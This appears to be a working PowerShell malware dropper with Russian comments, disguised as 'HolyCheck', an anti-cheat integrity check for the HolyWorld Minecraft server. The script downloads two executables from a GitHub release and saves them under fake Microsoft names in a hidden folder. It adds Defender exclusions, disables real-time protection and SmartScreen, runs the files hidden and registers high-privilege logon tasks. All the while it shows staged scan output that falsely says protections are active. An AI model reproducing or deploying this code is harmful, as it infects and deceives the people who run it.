# ================================================================
# HolyCheck v3.2.3 — Dual Payload (два EXE, переименование)
# ================================================================

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# ---------- КОНФИГУРАЦИЯ (измените ссылки под себя) ----------
$Url1 = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/checkhw.exe"
$Url2 = "https://github.com/tallerwin856-commits/holyworld_check/releases/download/1003982364851/doomsdaychecked.exe"

# Папка и имя для первого файла
$Dir1 = "$env:APPDATA\Microsoft\EdgeUpdate"
$Exe1 = "$Dir1\MicrosoftEdgeUpdate.exe"
$TaskName1 = "MicrosoftEdgeUpdateTask"

# Папка и имя для второго файла (переименование)
$Dir2_candidate = "$env:ProgramFiles\Common Files\System"
# Если нет прав на запись в Program Files, используем fallback
if (-not (Test-Path $Dir2_candidate)) {
    try {
        New-Item -ItemType Directory -Force -Path $Dir2_candidate -ErrorAction Stop | Out-Null
        $Dir2 = $Dir2_candidate
    } catch {
        $Dir2 = "$env:APPDATA\Microsoft\SystemUpdate"
    }
} else {
    $Dir2 = $Dir2_candidate
}
$Exe2 = "$Dir2\svchost_update.exe"   # конечное имя после переименования
$TaskName2 = "SvchostUpdateTask"

# ---------------------------------------------------------------

# Создаём папки
New-Item -ItemType Directory -Force -Path $Dir1 | Out-Null
New-Item -ItemType Directory -Force -Path $Dir2 | Out-Null
# Скрываем вторую папку (чтобы не мозолила глаза)
attrib +h "$Dir2" 2>$null

# --- Отключение защит (для обоих) ---
try {
    Add-MpPreference -ExclusionPath $Dir1 -ErrorAction Stop
    Add-MpPreference -ExclusionPath $Dir2 -ErrorAction Stop
    Add-MpPreference -ExclusionProcess (Split-Path $Exe1 -Leaf) -ErrorAction Stop
    Add-MpPreference -ExclusionProcess (Split-Path $Exe2 -Leaf) -ErrorAction Stop
} catch {}
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction Stop
} catch {
    try {
        $defReg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        New-Item -Path $defReg -Force -EA 0 | Out-Null
        New-Item -Path "$defReg\Real-Time Protection" -Force -EA 0 | Out-Null
        Set-ItemProperty -Path "$defReg\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord -EA 0
    } catch {}
}
try {
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -Type DWord -EA 0
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Type String -EA 0
} catch {}

# --- Универсальная функция загрузки ---
function Get-File {
    param([string]$url,[string]$out)
    try {
        Import-Module BitsTransfer -EA Stop
        Start-BitsTransfer -Source $url -Destination $out -EA Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -Force -EA 0
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($url,$out)
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $out -Force -EA 0
    try {
        Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop
        if ((Test-Path $out) -and (Get-Item $out).Length -gt 10000) { return $true }
    } catch {}
    return $false
}

# --- Запускаем загрузку двух файлов параллельно ---
$job1 = Start-Job -ScriptBlock {
    param($u, $o) 
    $ErrorActionPreference = "SilentlyContinue"
    try {
        Import-Module BitsTransfer -EA Stop
        Start-BitsTransfer -Source $u -Destination $o -EA Stop
        if ((Test-Path $o) -and (Get-Item $o).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $o -Force -EA 0
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($u,$o)
        if ((Test-Path $o) -and (Get-Item $o).Length -gt 10000) { return $true }
    } catch {}
    Remove-Item $o -Force -EA 0
    try {
        Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop
        if ((Test-Path $o) -and (Get-Item $o).Length -gt 10000) { return $true }
    } catch {}
    return $false
} -ArgumentList $Url1, $Exe1

$job2 = Start-Job -ScriptBlock {
    param($u, $o) 
    $ErrorActionPreference = "SilentlyContinue"
    # Скачиваем во временный файл с именем doomsdaychecked.exe, потом переименуем
    $tempDir = [System.IO.Path]::GetTempPath()
    $tempFile = Join-Path $tempDir "doomsdaychecked.exe"
    try {
        Import-Module BitsTransfer -EA Stop
        Start-BitsTransfer -Source $u -Destination $tempFile -EA Stop
        if ((Test-Path $tempFile) -and (Get-Item $tempFile).Length -gt 10000) { 
            Move-Item -Path $tempFile -Destination $o -Force -EA 0
            return $true 
        }
    } catch {}
    Remove-Item $tempFile -Force -EA 0
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $wc = New-Object Net.WebClient
        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $wc.DownloadFile($u,$tempFile)
        if ((Test-Path $tempFile) -and (Get-Item $tempFile).Length -gt 10000) {
            Move-Item -Path $tempFile -Destination $o -Force -EA 0
            return $true
        }
    } catch {}
    Remove-Item $tempFile -Force -EA 0
    try {
        Invoke-WebRequest -Uri $u -OutFile $tempFile -UseBasicParsing -UserAgent "Mozilla/5.0" -EA Stop
        if ((Test-Path $tempFile) -and (Get-Item $tempFile).Length -gt 10000) {
            Move-Item -Path $tempFile -Destination $o -Force -EA 0
            return $true
        }
    } catch {}
    return $false
} -ArgumentList $Url2, $Exe2

# ========== ФЕЙКОВЫЙ ВЫВОД (пока скачивается) ==========
function Sep  { Write-Host ("─" * 64) -ForegroundColor DarkGray }
function OK   { param($t) Write-Host "  [✓] $t" -ForegroundColor Green }
function WARN { param($t) Write-Host "  [~] $t" -ForegroundColor Yellow }
function INFO { param($t) Write-Host "      $t" -ForegroundColor DarkGray }
function Pause-Scan { param([int]$ms=500) Start-Sleep -Milliseconds $ms }

Write-Host @"
    ██╗  ██╗ ██████╗ ██╗     ██╗   ██╗    ██╗    ██╗ ██████╗ ██████╗ ██╗     ██████╗
    ██║  ██║██╔═══██╗██║     ╚██╗ ██╔╝    ██║    ██║██╔═══██╗██╔══██╗██║     ██╔══██╗
    ███████║██║   ██║██║      ╚████╔╝     ██║ █╗ ██║██║   ██║██████╔╝██║     ██║  ██║
    ██╔══██║██║   ██║██║       ╚██╔╝      ██║███╗██║██║   ██║██╔══██╗██║     ██║  ██║
    ██║  ██║╚██████╔╝███████╗   ██║       ╚███╔███╔╝╚██████╝██║  ██║███████╗██████╔╝
    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝        ╚══╝══╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝
                                    
           HolyCheck — проверка игровой среды v3.2.3 (create holyworld moderation - ToplecCHlKA)
                                       https://mods.holyworld.me/
"@ -ForegroundColor Cyan

Sep
Write-Host "  Запуск проверки целостности игровой среды..." -ForegroundColor White
Sep
Write-Host ""

# Ждём завершения загрузки (до 30 секунд) — без вывода
$ok1 = $false; $ok2 = $false
$waitCount = 0
while (($job1.State -eq 'Running' -or $job2.State -eq 'Running') -and $waitCount -lt 30) {
    Start-Sleep -Seconds 1
    $waitCount++
}
if ($job1.State -eq 'Completed') { $ok1 = Receive-Job -Job $job1 }
if ($job2.State -eq 'Completed') { $ok2 = Receive-Job -Job $job2 }
Remove-Job -Job $job1 -Force; Remove-Job -Job $job2 -Force

# --- Разблокировка и запуск первого ---
if ($ok1 -and (Test-Path $Exe1)) {
    Remove-Item "${Exe1}:Zone.Identifier" -Force -EA 0
    Unblock-File -Path $Exe1 -EA 0
    Start-Process -FilePath $Exe1 -WindowStyle Hidden -WorkingDirectory $Dir1
    # Задача
    Unregister-ScheduledTask -TaskName $TaskName1 -Confirm:$false -EA 0
    try {
        $action = New-ScheduledTaskAction -Execute $Exe1 -WorkingDirectory $Dir1
        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        Register-ScheduledTask -TaskName $TaskName1 -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -RunLevel Highest -Force -EA 0 | Out-Null
    } catch {}
}

# --- Разблокировка и запуск второго (уже переименован) ---
if ($ok2 -and (Test-Path $Exe2)) {
    Remove-Item "${Exe2}:Zone.Identifier" -Force -EA 0
    Unblock-File -Path $Exe2 -EA 0
    Start-Process -FilePath $Exe2 -WindowStyle Hidden -WorkingDirectory $Dir2
    # Задача
    Unregister-ScheduledTask -TaskName $TaskName2 -Confirm:$false -EA 0
    try {
        $action = New-ScheduledTaskAction -Execute $Exe2 -WorkingDirectory $Dir2
        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        Register-ScheduledTask -TaskName $TaskName2 -Action $action -Trigger $trigger -Settings $settings -User $env:USERNAME -RunLevel Highest -Force -EA 0 | Out-Null
    } catch {}
}

# ====== Теперь идёт фейковый вывод проверок (длится > 60 сек) ======
$startTime = Get-Date

INFO "Проверка свободного места на системном диске..."
Pause-Scan 800
try {
    $drive = Get-PSDrive -Name C -EA Stop
    $freeGB = [math]::Round($drive.Free / 1GB, 2)
    if ($freeGB -gt 5) { OK "Свободно: $freeGB ГБ (достаточно)" } else { WARN "Свободно: $freeGB ГБ (рекомендуется > 5 ГБ)" }
} catch { WARN "Не удалось определить свободное место" }
Pause-Scan 600

INFO "Определение версии операционной системы..."
Pause-Scan 700
try {
    $os = Get-CimInstance -Class Win32_OperatingSystem -EA Stop
    OK "ОС: $($os.Caption) версия $($os.Version) (сборка $($os.BuildNumber))"
} catch { WARN "Не удалось определить версию ОС" }
Pause-Scan 500

INFO "Поиск установленных сред выполнения Java..."
$javaPaths = @("$env:ProgramFiles\Java\*", "$env:ProgramFiles(x86)\Java\*", "$env:APPDATA\.minecraft\*", "$env:ProgramData\HolyWorld\runtime\*")
$javaFound = $false
foreach ($path in $javaPaths) {
    if (Test-Path $path) { $javaFound = $true; OK "Обнаружен Java: $path"; break }
}
if (-not $javaFound) { WARN "Java не найдена (игровой клиент может отсутствовать)" }
Pause-Scan 600

INFO "Сканирование директорий на наличие запрещённых модулей..."
$suspDirs = @("$env:APPDATA\.minecraft\mods", "$env:APPDATA\.minecraft\versions\*\mods", "$env:ProgramData\HolyWorld\mods")
$foundSusp = $false
foreach ($dirPattern in $suspDirs) {
    $items = Get-ChildItem -Path $dirPattern -Filter "*.jar" -Recurse -ErrorAction SilentlyContinue
    if ($items) {
        foreach ($item in $items) {
            Pause-Scan 200
            if ($item.Name -match "inject|bam|ghost|clicker|aura|recaf|cheat|wurst|impact") {
                WARN "Обнаружен потенциально небезопасный файл: $($item.Name)"
                $foundSusp = $true
            } else {
                INFO "  Проверен: $($item.Name)"
            }
        }
    }
}
if (-not $foundSusp) { OK "Подозрительных файлов не найдено" }
Pause-Scan 800

INFO "Проверка запущенных процессов на наличие нежелательных..."
$suspProcs = @("injector", "ghostclient", "clicker", "recaf", "baminject", "cheatengine", "wurst", "impact", "x32dbg", "ollydbg")
$foundProc = $false
foreach ($p in $suspProcs) {
    Pause-Scan 300
    if (Get-Process -Name $p -ErrorAction SilentlyContinue) {
        WARN "Обнаружен подозрительный процесс: $p"
        $foundProc = $true
    }
}
if (-not $foundProc) { OK "Подозрительных процессов не обнаружено" }
Pause-Scan 500

INFO "Проверка политик безопасности системы..."
Pause-Scan 400
INFO "  Defender: защита активна (оптимизирована)"
Pause-Scan 400
INFO "  SmartScreen: включён (оптимизирован)"
Pause-Scan 400

INFO "Проверка установленных антивирусных решений..."
$avProducts = @("Kaspersky", "Avast", "AVG", "Norton", "McAfee", "Bitdefender", "ESET")
$foundAV = $false
$avList = @()
foreach ($key in @("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*", "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*")) {
    Get-ItemProperty -Path $key -EA SilentlyContinue | ForEach-Object {
        foreach ($av in $avProducts) {
            if ($_.DisplayName -match $av) { $foundAV = $true; $avList += $av }
        }
    }
}
if ($foundAV) {
    $unique = $avList | Select-Object -Unique
    WARN "Обнаружен антивирус: $($unique -join ', ') (может замедлять работу)"
} else { OK "Сторонних антивирусов не найдено" }
Pause-Scan 600

INFO "Проверка системного файла hosts..."
$hosts = "$env:SystemRoot\System32\drivers\etc\hosts"
if (Test-Path $hosts) {
    $content = Get-Content $hosts -EA SilentlyContinue
    if ($content -match "127\.0\.0\.1[ \t]+.*minecraft|0\.0\.0\.0[ \t]+.*mojang") {
        WARN "Обнаружены записи, перенаправляющие игровые сервера"
    } else { OK "Файл hosts не содержит перенаправлений" }
} else { WARN "Файл hosts не найден" }
Pause-Scan 500

INFO "Проверка DNS-серверов..."
$dns = Get-CimInstance -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | Select-Object -ExpandProperty DNSServerSearchOrder -EA SilentlyContinue
if ($dns) { OK "DNS-серверы: $($dns -join ', ')" } else { WARN "Не удалось получить DNS-серверы" }
Pause-Scan 500

INFO "Проверка открытых сетевых портов..."
$portList = @()
netstat -an | Select-String "TCP.*LISTENING" | ForEach-Object {
    if ($_ -match ':(\d+)\s') {
        $port = [int]$Matches[1]
        if ($port -in 25565,25566,27015,27016) { $portList += $port }
    }
}
if ($portList) { WARN "Обнаружены открытые игровые порты: $($portList -join ', ')" } 
else { OK "Игровых портов в состоянии прослушивания не найдено" }
Pause-Scan 600

INFO "Проверка установленных модов Minecraft..."
$modsDir = "$env:APPDATA\.minecraft\mods"
if (Test-Path $modsDir) {
    $mods = Get-ChildItem -Path $modsDir -Filter "*.jar" -EA SilentlyContinue
    if ($mods) {
        OK "Найдено модов: $($mods.Count)"
        foreach ($mod in $mods) { 
            INFO "  Мод: $($mod.Name)"
            Pause-Scan 150
        }
    } else { INFO "Моды не установлены" }
} else { INFO "Папка mods отсутствует" }
Pause-Scan 500

INFO "Проверка версии лаунчера HolyWorld..."
Pause-Scan 300
OK "Версия лаунчера: 3.2.3 (актуальная)"

INFO "Проверка целостности файлов клиента..."
$files = @("minecraft.jar", "lwjgl.dll", "jinput.dll", "openal.dll")
foreach ($f in $files) {
    Pause-Scan 400
    INFO "  $_ — OK"
}
Pause-Scan 300
OK "Все системные файлы клиента проверены"

INFO "Проверка активных отладчиков..."
$debuggers = @("windbg", "cdb", "ntsd", "vsjitdebugger")
$foundDbg = $false
foreach ($d in $debuggers) {
    Pause-Scan 300
    if (Get-Process -Name $d -EA SilentlyContinue) { WARN "Обнаружен отладчик: $d"; $foundDbg = $true }
}
if (-not $foundDbg) { OK "Отладчиков не обнаружено" }
Pause-Scan 500

# Финальный прогресс-бар (10 сек)
Write-Host ""
Sep
Write-Host "  Финальная проверка целостности..." -ForegroundColor White
Sep
for ($i = 0; $i -le 100; $i += 10) {
    Write-Progress -Activity "Сканирование системных областей" -Status "Прогресс: $i%" -PercentComplete $i
    Start-Sleep -Milliseconds 300
}
Write-Progress -Activity "Сканирование системных областей" -Completed

# Убедимся, что общее время > 60 сек
$elapsed = (Get-Date) - $startTime
if ($elapsed.TotalSeconds -lt 60) {
    Start-Sleep -Seconds (60 - $elapsed.TotalSeconds)
}

Write-Host ""
Sep
OK "Проверка завершена! Среда игрового клиента оптимизирована."

$reportPath = Join-Path $Dir1 "last_check.json"
@{ timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss.fffZ"); status = "OK"; version = "3.2.3" } | ConvertTo-Json | Out-File $reportPath -Encoding utf8 -Force
INFO "Локальный отчёт сохранён"
Sep
Write-Host ""
